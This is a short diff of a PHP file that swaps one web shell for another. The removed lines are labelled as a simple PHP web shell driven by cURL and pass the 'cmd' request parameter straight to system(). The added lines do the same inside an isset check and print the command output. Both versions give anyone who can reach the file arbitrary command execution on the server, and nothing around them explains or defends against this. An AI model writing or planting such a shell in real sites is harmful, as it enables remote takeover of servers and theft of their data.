@@ -1,8 +1,9 @@
 <?php
-
-// This is a simple PHP web shell.
-// Use cURL to interact
-
-system($_REQUEST["cmd"]);
-
+if(isset($_REQUEST['cmd']) ){
+echo "<pre>";
+$cmd = ($_REQUEST['cmd']);
+system($cmd);
+echo "</pre>";
+die;
+}
 ?>
